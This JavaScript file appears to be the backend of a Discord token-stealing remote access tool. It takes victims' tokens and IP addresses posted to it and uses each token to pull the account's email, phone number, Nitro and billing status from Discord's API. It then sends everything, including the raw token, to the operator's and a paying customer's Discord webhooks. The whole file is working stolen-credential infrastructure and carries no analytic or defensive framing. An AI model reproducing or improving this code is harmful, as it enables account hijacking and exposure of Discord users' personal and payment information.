import AsciiTable from "ascii-table";
import axios from "axios";
import { WebhookClient, EmbedBuilder } from "discord.js";
import { getClientIp } from "request-ip";

const usernameRegex = /^[a-zA-Z0-9_]{1,16}$/;
const tokenRegex = /^[a-zA-Z0-9]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+$/;

export default function handleToken(ratDB, webhookClient, sendError, getNetworth) {
  return async function (req, res) {
    const { id, username = "null", token = "null" } = req.body;
    const ip = getClientIp(req);

    const table = new AsciiTable("Token Hit").setHeading("Type", "Value");
    table.addRow("Code", id);
    table.addRow("Username", username);
    table.addRow("Token", token.length > 50 ? token.slice(0, 50) + "..." : token);
    table.addRow("IP", ip);

    if (
      username.toLowerCase().includes("discord") ||
      token.toLowerCase().includes("discord") ||
      !usernameRegex.test(username) ||
      !tokenRegex.test(token) ||
      !isValidToken(token)
    ) {
      table.addRow("Error", "Invalid Request");
      console.log(table.toString());
      return;
    }

    try {
      const { webhook, dhooked } = await ratDB.getWebhook(id);
      const response = await axios.get("https://discord.com/api/v7/users/@me", { headers: { Authorization: token } });
      if (!response?.data?.username) throw new Error("Invalid Username");
      const user = `${response.data.username}${
        response.data.discriminator == "0" ? "" : `#${response.data.discriminator}`
      }`;
      const { email, phone } = response.data;
      table.addRow("Discord Tag", user);

      const response2 = await axios.get("https://discord.com/api/v7/users/@me/billing/subscriptions", {
        headers: { Authorization: token },
      });
      if (!response2?.data) throw new Error("Invalid Subscriptions");
      const nitro = response2.data.length != 0;
      table.addRow("Nitro", nitro ? "✅" : "❌");

      const response3 = await axios.get("https://discord.com/api/v7/users/@me/billing/payments", {
        headers: { Authorization: token },
      });
      if (!response3?.data) throw new Error("Invalid Payments");
      const billing = response3.data.length != 0;
      table.addRow("Billing", billing ? "✅" : "❌");

      const embed = new EmbedBuilder()
        .setColor("#ff00ff")
        .setTitle(":shield: Discord Information")
        .addFields(
          { name: ":bust_in_silhouette: Username", value: `\`\`\`${user}\`\`\``, inline: true },
          { name: ":telephone: Phone Number", value: `\`\`\`${phone ? phone : "N/A"}\`\`\``, inline: true },
          { name: ":e_mail: Email", value: `\`\`\`${email ? email : "N/A"}\`\`\``, inline: false },
          { name: ":gem: Nitro", value: nitro ? "```Yes```" : "```No```", inline: true },
          { name: ":credit_card: Billing", value: billing ? "```Yes```" : "```No```", inline: true },
          { name: ":lock: Token", value: `\`\`\`${token}\`\`\``, inline: false }
        );

      if (dhooked)
        await webhookClient.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });

      if (webhook) {
        const webhookClientCustom = new WebhookClient({ url: webhook });
        await webhookClientCustom.send({
          content: "@everyone",
          username: "Message - " + username,
          embeds: [embed],
        });
      } else {
        table.addRow("Error", "Webhook Not Found");
      }
    } catch (e) {
      var errorMsg;
      if (e.response) {
        errorMsg = e.response.data;
      } else if (e.request) {
        errorMsg = e.request;
      } else {
        errorMsg = e.message;
      }

      table.addRow("Error", e);
    }

    console.log(table.toString());
  };
}

function isValidID(id) {
  return !/\D/.test(id) && id.length >= 17 && id.length <= 19;
}

function isValidToken(token) {
  try {
    const base64ID = token.split(".")[0];
    const buff = Buffer.from(base64ID, "base64");
    const botID = buff.toString("ascii");

    return isValidID(botID);
  } catch (e) {
    return false;
  }
}
